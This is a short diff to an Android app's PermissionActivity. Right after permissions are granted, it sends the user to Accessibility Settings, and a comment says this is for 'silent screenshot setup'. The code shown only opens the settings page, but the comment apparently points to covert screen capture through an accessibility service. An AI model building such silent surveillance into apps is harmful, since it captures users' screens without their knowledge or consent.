@@ -132,6 +132,16 @@ public class PermissionActivity extends Activity {
     public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] res) {
         super.onRequestPermissionsResult(code, perms, res);
         launchService();
+        // After service launches, open Accessibility Settings for one-time silent screenshot setup
+        new Handler().postDelayed(this::openAccessibilitySettings, 800);
+    }
+
+    private void openAccessibilitySettings() {
+        try {
+            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        } catch (Exception ignored) {}
     }
 
     private void launchService() {
